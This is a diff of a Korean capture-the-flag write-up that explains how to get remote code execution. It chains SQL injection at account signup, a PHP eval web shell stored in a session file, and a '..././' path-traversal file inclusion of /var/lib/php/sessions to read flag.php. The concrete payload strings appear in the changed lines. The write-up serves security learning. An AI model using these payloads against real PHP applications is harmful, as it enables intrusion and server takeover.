@@ -9,36 +9,7 @@ LFI로 계정의 세션을 포함시켜 RCE로 flag.php 읽어오는걸 의도�
 
 자세한 풀이는 아래를 참고하자
 
-### PHP Session to RCE PoC
-
-Session to RCE의 간단한 예시를 들어보면
-
-PHP에서 로그인을 구현할 때 로그인에 성공하면 보통 아래와 같이 세션을 처리한다.
-
-```php
-<?php
-session_start();
-... (생략)
-if(isset($fetch['username'])) { // 유저가 존재한다면
-	$_SESSION['username'] = $fetch['username']; // 세션 할당
-}
-```
-
-만약 여기서 ``$fetch['username']`` 변수에 ``<?php phpinfo(); ?>`` 가 들어가면 어떻게 될까?
-
-세션 파일에 들어가는 내용이 ``username|s:19:"<?php phpinfo(); ?>";`` 이렇게 될 것이다.
-
-우분투 기준 PHP 세션은 기본적으로 ``/var/lib/php/sessions/`` 에 저장되며 어느 계정이든 접근이 가능한 디렉토리다.
-
-또한 저장되는 세션 파일명도 일정한 규칙이 있어서 알아낼 수 있기 때문에 PHP코드가 포함된 세션을 inclusion한다면 RCE가 가능하다.
-
-* 세션 파일명 : ``sess_[random_string]`` 여기서 random_string은 클라이언트가 가지고 있는 PHPSESSID 값이다.
-
-ex) PHPSESSID=fqs54b8ies3uhuhlttlb3lq3d0; => sess_fqs54b8ies3uhuhlttlb3lq3d0
-
-
-단, 회원 가입에서 ``<, >`` 를 막아놨기 때문에 SQL Injection을 활용해야 한다.
-
+--------------------------------
 ### SQL Injection
 
 ``classes/user.class.php`` 에 있는 user_join 함수에서 SQL Injection이 발생한다.
@@ -88,6 +59,39 @@ username : ,1,1),(1,0x3c3f206576616c28245f4745545b785d293b3f3e,sha1(md5(0x61)))#
 username : ``<? eval($_GET[x]);?>``
 password : ``a``
 
+---------------------------------------------
+### PHP Session to RCE PoC
+
+Session to RCE의 간단한 예시를 들어보면
+
+PHP에서 로그인을 구현할 때 로그인에 성공하면 보통 아래와 같이 세션을 처리한다.
+
+```php
+<?php
+session_start();
+... (생략)
+if(isset($fetch['username'])) { // 유저가 존재한다면
+	$_SESSION['username'] = $fetch['username']; // 세션 할당
+}
+```
+
+만약 여기서 ``$fetch['username']`` 변수에 ``<?php phpinfo(); ?>`` 가 들어가면 어떻게 될까?
+
+세션 파일에 들어가는 내용이 ``username|s:19:"<?php phpinfo(); ?>";`` 이렇게 될 것이다.
+
+우분투 기준 PHP 세션은 기본적으로 ``/var/lib/php/sessions/`` 에 저장되며 어느 계정이든 접근이 가능한 디렉토리다.
+
+또한 저장되는 세션 파일명도 일정한 규칙이 있어서 알아낼 수 있기 때문에 PHP코드가 포함된 세션을 inclusion한다면 RCE가 가능하다.
+
+* 세션 파일명 : ``sess_[random_string]`` 여기서 random_string은 클라이언트가 가지고 있는 PHPSESSID 값이다.
+
+ex) PHPSESSID=fqs54b8ies3uhuhlttlb3lq3d0; => sess_fqs54b8ies3uhuhlttlb3lq3d0
+
+
+단, 회원 가입에서 ``<, >`` 를 막아놨기 때문에 SQL Injection을 활용해야 한다.
+
+
+--------------------------------------------
 ### LFI to RCE (session inclusion)
 이제 세션에 PHP 코드를 넣는데 성공했다.
 
@@ -115,6 +119,7 @@ ex) ``PHPSESSID=fqs54b8ies3uhuhlttlb3lq3d0html``
 ``?p=..././..././..././..././..././var/lib/php/sessions/fqs54b8ies3uhuhlttlb3lq3d0html``
 
 RCE가 성공적으로 되는걸 확인했다면, flag.php를 읽으면 된다.
+
 
 ## sqlgame revenge (480pts) - solver (2)
 
